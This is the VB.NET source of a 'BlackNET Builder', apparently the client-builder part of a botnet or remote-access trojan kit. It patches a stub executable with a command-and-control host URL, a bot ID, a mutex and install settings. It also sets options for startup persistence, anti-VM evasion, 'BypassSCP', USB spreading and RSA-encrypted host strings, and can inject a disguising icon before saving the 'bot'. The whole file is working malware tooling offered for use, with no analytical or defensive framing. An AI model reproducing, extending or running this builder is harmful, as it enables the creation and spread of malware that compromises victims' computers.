﻿Imports System.Security.Cryptography
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
' - - - - - - - - - - -
' BlackNET Builder
' v1.0.0
' Developed by: Black.Hacker
' Tnx to: njQ8, FamFamFam, PlasmaRAT, NirsoSoft.
' - - - - - - - - - - -
Public Class Form1
    Dim dialog As New SaveFileDialog
    Dim a As New OpenFileDialog
    Public trd As System.Threading.Thread
    Public st As Integer = 0
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Function Randomisi2(ByVal lenght As Integer, ByVal charc As String) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = charc.ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub FlatTextBox3_MouseMove(sender As Object, e As MouseEventArgs) Handles FlatTextBox3.MouseMove
        FlatTextBox3.Text = "BN[xxxxxx-123456]".Replace("xxxxxx", Randomisi2(7, "ABCDEFGHIJKLMNOPQRSTUVWXYZ")).Replace("123456", Randomisi2(6, "1234567890"))
    End Sub
    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        If Not File.Exists((Application.StartupPath & "\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        ElseIf (FlatTextBox1.Text = "") Then
            Interaction.MsgBox("Please Enter Your BlackNET HOST URL.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[HOST]") Then
                                            If FlatCheckBox6.Checked Then
                                                current.Operand = RSA_Encrypt(FlatTextBox1.Text, TextBox1.Text)
                                            Else
                                                current.Operand = FlatTextBox1.Text
                                            End If
                                        Else
                                            If (str = "[ID]") Then
                                                current.Operand = FlatTextBox2.Text
                                            End If

                                            If (str = "[StartupName]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\" & "Stub.exe"))
                                            End If

                                            If (str = "[MUTEX]") Then
                                                current.Operand = FlatTextBox3.Text
                                            End If

                                            If (str = "[Install_Path]") Then
                                                current.Operand = FlatComboBox1.Text
                                            End If

                                            If (str = "[Install_Name]") Then
                                                current.Operand = FlatTextBox5.Text
                                            End If

                                            If (str = "[Startup]") Then
                                                current.Operand = FlatCheckBox1.Checked.ToString
                                            End If


                                            If (str = "[BypassSCP]") Then
                                                current.Operand = FlatCheckBox2.Checked.ToString
                                            End If


                                            If (str = "[AntiVM]") Then
                                                current.Operand = FlatCheckBox3.Checked.ToString
                                            End If

                                            If (str = "[HardInstall]") Then
                                                current.Operand = FlatCheckBox7.Checked.ToString
                                            End If

                                            If (str = "[USBSpread]") Then
                                                current.Operand = FlatCheckBox4.Checked.ToString
                                            End If

                                            If (str = "[RSAKey]") Then
                                                current.Operand = TextBox2.Text
                                            End If

                                            If (str = "[RSAStatus]") Then
                                                current.Operand = FlatCheckBox6.Checked.ToString
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog

                .InitialDirectory = Application.StartupPath
                .FileName = "Client" & ".exe"
                .Filter = "Executable Applications " & "(*.exe)" & "|*" & ".exe"
                .Title = "Choose a place to save your bot | BlackNET v1.0.0"
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                If FlatCheckBox5.Checked = True Then
                    IconChanger.InjectIcon(dialog.FileName, a.FileName)
                End If
                MsgBox("Your Client Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
        End If
    End Sub
    Public Function RSA_Encrypt(ByVal Input As String, ByVal RSAKey As String) As String
        Dim encrypted() As Byte
        Using RSA As New Security.Cryptography.RSACryptoServiceProvider(2048)
            RSA.PersistKeyInCsp = False
            RSA.FromXmlString(RSAKey)
            Dim buffer As Byte() = System.Text.Encoding.UTF8.GetBytes(Input)
            encrypted = RSA.Encrypt(buffer, True)
        End Using
        Return Convert.ToBase64String(encrypted)
    End Function
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        With a
            .Filter = "icon File (*.ico)|*.ico"
            .Title = "Select Icon"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBox1.Image = Image.FromFile(a.FileName)
            End If
        End With
    End Sub
    Private Function CreateNewKey() As String
        Dim Keys As Keypair = Keypair.CreateNewKeys
        TextBox1.Text = Keys.Publickey
        TextBox2.Text = Keys.Privatekey
    End Function

    Private Sub FlatCheckBox6_CheckedChanged(sender As Object) Handles FlatCheckBox6.CheckedChanged
        If FlatCheckBox6.Checked Then
            CreateNewKey()
        Else
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub FlatCheckBox5_CheckedChanged(sender As Object) Handles FlatCheckBox5.CheckedChanged
        If FlatCheckBox5.Checked = False Then
            If Not PictureBox1.Image Is Nothing Then
                PictureBox1.Image = Nothing
            End If
        End If
    End Sub

    Private Sub FormSkin1_Click(sender As Object, e As EventArgs) Handles FormSkin1.Click

    End Sub

    Private Sub FlatCheckBox7_CheckedChanged(sender As Object) Handles FlatCheckBox7.CheckedChanged
        Select Case FlatCheckBox7.Checked
            Case True
                FlatComboBox1.Enabled = True
                FlatTextBox5.Enabled = True
            Case False
                FlatComboBox1.Enabled = False
                FlatTextBox5.Enabled = False
        End Select
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        FlatComboBox1.SelectedItem = FlatComboBox1.Items.Item(0)
    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged

    End Sub
End Class
